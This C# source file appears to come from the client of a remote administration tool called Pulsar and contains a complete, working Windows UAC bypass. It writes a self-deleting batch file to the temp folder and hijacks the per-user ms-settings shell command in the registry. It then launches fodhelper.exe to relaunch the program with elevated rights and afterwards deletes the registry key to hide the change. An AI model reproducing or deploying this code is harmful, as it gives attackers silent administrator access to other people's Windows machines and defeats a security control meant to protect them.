using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Client.Helper.UAC
{
    public class Bypass
    {
        public static void DoUacBypass()
        {
            string exePath = Application.ExecutablePath;

            string batPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "uacbypass.bat");

            string batContent = $@"
        @echo off
        timeout /t 4 /nobreak >nul
        start """" ""{exePath}""
        (goto) 2>nul & del ""%~f0""
        ";

            System.IO.File.WriteAllText(batPath, batContent, Encoding.ASCII);

            string command = $"conhost --headless \"{batPath}\"";

            using (RegistryKey classesKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes", true))
            {
                using (RegistryKey cmdKey = classesKey.CreateSubKey(@"ms-settings\Shell\Open\command"))
                {
                    cmdKey.SetValue("", command, RegistryValueKind.String);
                    cmdKey.SetValue("DelegateExecute", "", RegistryValueKind.String);
                }
            }

            Process p = new Process();
            p.StartInfo.FileName = "fodhelper.exe";
            p.Start();

            Thread.Sleep(1000);

            using (RegistryKey classesKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Classes", true))
            {
                try
                {
                    classesKey.DeleteSubKeyTree("ms-settings");
                }
                catch { }
            }
        }
    }
}
